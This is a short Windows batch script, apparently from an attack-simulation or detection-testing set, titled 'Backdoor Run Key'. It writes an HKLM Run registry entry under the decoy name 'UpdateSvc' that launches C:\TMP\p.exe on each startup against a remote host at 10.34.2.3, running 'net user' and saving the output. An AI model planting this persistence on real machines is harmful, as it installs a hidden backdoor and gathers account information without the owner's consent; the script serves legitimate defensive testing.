@ECHO OFF

ECHO ===========================================================================
ECHO Backdoor Run Key
ECHO.
ECHO Registering a malicious RUN key
ping -n 5 127.0.0.1 > NUL

reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v UpdateSvc /t REG_SZ /d "C:\TMP\p.exe -s \\10.34.2.3 'net user' > C:\TMP\o2.txt" /f
